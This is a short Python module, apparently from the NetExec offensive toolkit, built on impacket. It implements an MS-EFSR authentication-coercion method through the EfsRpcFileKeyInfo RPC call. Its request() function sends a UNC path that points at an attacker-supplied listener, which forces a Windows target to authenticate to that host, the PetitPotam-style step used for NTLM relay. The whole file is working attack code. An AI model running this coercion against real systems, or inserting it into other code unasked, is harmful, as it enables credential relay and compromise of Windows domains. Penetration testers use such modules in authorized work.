from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


class EfsRpcFileKeyInfo(NDRCALL):
    """Structure to make the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 12
    structure = (
        ("FileName", WSTR),   # Type: wchar_t *
        ("InfoClass", DWORD)  # Type: DWORD
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcFileKeyInfo()
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    request["InfoClass"] = 0
    dce.request(request)